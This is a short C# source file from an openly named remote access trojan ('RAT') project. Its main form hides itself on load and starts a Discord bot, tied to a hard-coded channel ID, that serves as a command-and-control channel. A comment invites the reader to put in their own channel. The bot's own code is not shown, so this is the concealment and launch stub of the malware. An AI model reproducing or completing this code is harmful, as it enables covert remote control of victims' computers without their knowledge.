using System;
using System.Windows.Forms;

namespace RAT
{
    public partial class Main : Form
    {
        private Discord _bot;

        public Main()
        {
            InitializeComponent();
            _bot = new Discord(ulong.Parse("1126813873832476778")); // replace with your channel's ID
        }
        private async void Main_Load(object sender, EventArgs e)
        {
            // Hide the form
            this.Visible = false;

            // Wait for the bot to finish running
            await _bot.RunBotAsync();
        }


    }
}